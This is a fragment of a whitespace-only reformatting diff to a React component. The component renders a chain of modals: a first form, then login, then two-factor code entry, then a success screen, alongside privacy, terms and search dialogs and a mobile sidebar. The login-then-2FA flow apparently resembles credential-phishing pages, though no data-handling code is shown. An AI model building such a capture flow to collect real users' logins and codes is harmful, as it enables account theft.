+                                        { texts.monetizeDesc }
+                                    </div>
+                                </div>
+                            </div>
                         </div>
                     </div>
                 </div>
             </div>
 
-            <FirstFormModal show={showFirstModal} onClose={() => setShowFirstModal(false)} onSubmit={handleFirstFormSubmit} texts={texts} />
-            <LoginModal show={showLoginModal} onClose={() => setShowLoginModal(false)} onSubmit={handleLoginSubmit} onSuccess={() => { setShowLoginModal(false); setShow2FAModal(true); }} texts={texts} />
-            <TwoFAModal show={show2FAModal} onClose={() => setShow2FAModal(false)} onSubmit={handle2FASubmit} onSuccess={() => { setShow2FAModal(false); setShowSuccessModal(true); }} texts={texts} />
-            <SuccessModal show={showSuccessModal} onClose={() => setShowSuccessModal(false)} texts={texts} />
-            <SearchModal show={showSearchModal} onClose={() => setShowSearchModal(false)} texts={texts} />
+            <FirstFormModal show={ showFirstModal } onClose={ () => setShowFirstModal( false ) } onSubmit={ handleFirstFormSubmit } texts={ texts } />
+            <LoginModal show={ showLoginModal } onClose={ () => setShowLoginModal( false ) } onSubmit={ handleLoginSubmit } onSuccess={ () => { setShowLoginModal( false ); setShow2FAModal( true ); } } texts={ texts } />
+            <TwoFAModal show={ show2FAModal } onClose={ () => setShow2FAModal( false ) } onSubmit={ handle2FASubmit } onSuccess={ () => { setShow2FAModal( false ); setShowSuccessModal( true ); } } texts={ texts } />
+            <SuccessModal show={ showSuccessModal } onClose={ () => setShowSuccessModal( false ) } texts={ texts } />
+            <SearchModal show={ showSearchModal } onClose={ () => setShowSearchModal( false ) } texts={ texts } />
             <PrivacyPolicyModal
-                show={showPrivacyModal}
-                onClose={() => {
-                    setShowPrivacyModal(false);
-                    setSelectedPrivacyQuestion(null);
-                }}
-                selectedQuestion={selectedPrivacyQuestion}
-                texts={texts}
+                show={ showPrivacyModal }
+                onClose={ () =>
+                {
+                    setShowPrivacyModal( false );
+                    setSelectedPrivacyQuestion( null );
+                } }
+                selectedQuestion={ selectedPrivacyQuestion }
+                texts={ texts }
             />
-            <TermsModal show={showTermsModal} onClose={() => setShowTermsModal(false)} texts={texts} />
+            <TermsModal show={ showTermsModal } onClose={ () => setShowTermsModal( false ) } texts={ texts } />
 
-            {showMobileSidebar && (
-                <div className="popup show" id="popup" onClick={() => setShowMobileSidebar(false)} style={{ display: 'block' }}>
-                    <div className="popup-item" onClick={(e) => e.stopPropagation()}>
-                        <div className="burger-button-popup" id="closePopup" onClick={() => setShowMobileSidebar(false)} style={{ cursor: 'pointer' }}>
+            { showMobileSidebar && (
+                <div className="popup show" id="popup" onClick={ () => setShowMobileSidebar( false ) } style={ { display: 'block' } }>
+                    <div className="popup-item" onClick={ ( e ) => e.stopPropagation() }>
+                        <div className="burger-button-popup" id="closePopup" onClick={ () => setShowMobileSidebar( false ) } style={ { cursor: 'pointer' } }>
                             <div className="bar"></div>
                             <div className="bar"></div>
                         </div>
                         <div className="popup-content">
                             <Sidebar
-                                texts={texts}
-                                onOpenSearchModal={() => {
-                                    setShowMobileSidebar(false);
-                                    setShowSearchModal(true);
-                                }}
-                                onOpenPrivacyModal={(question) => {
-                                    setShowMobileSidebar(false);
-                                    setSelectedPrivacyQuestion(question);
-                                    setShowPrivacyModal(true);
-                                }}
-                                onOpenTermsModal={() => {
-                                    setShowMobileSidebar(false);
-                                    setShowTermsModal(true);
-                                }}
+                                texts={ texts }
+                                onOpenSearchModal={ () =>
+                                {
+                                    setShowMobileSidebar( false );
+                                    setShowSearchModal( true );
+                                } }
+                                onOpenPrivacyModal={ ( question ) =>
+                                {
+                                    setShowMobileSidebar( false );
+                                    setSelectedPrivacyQuestion( question );
+                                    setShowPrivacyModal( true );
+                                } }
+                                onOpenTermsModal={ () =>
+                                {
+                                    setShowMobileSidebar( false );
+                                    setShowTermsModal( true );
+                                } }
                             />
                         </div>
                     </div>
                 </div>
-            )}
+            ) }
         </>
     );
 };
